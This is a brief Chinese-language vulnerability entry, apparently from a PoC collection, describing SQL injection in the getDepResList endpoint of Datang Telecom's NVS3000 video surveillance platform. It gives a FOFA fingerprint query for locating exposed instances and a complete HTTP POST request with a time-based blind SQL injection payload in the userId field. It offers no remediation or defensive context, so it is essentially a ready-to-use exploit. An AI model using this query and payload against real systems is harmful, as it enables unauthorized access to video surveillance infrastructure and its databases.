## 大唐电信NVS3000综合视频监控平台getDepResList存在SQL注入漏洞

大唐电信科技股份有限公司NVS3000综合视频监控平台 /nvsthird/getDepResList 接口存在SQL注入。

## fofa

```
(body="NVS3000综合视频监控平台" && title=="综合视频监控平台") || app="大唐电信-NVS3000"
```

## poc

```yaml
POST /nvsthird/getDepResList HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Length: 49

{"userId":"1' AND (SELECT 8845 FROM (SELECT(SLEEP(5)))KRNM) AND 'JWDU'='JWDU"}
```

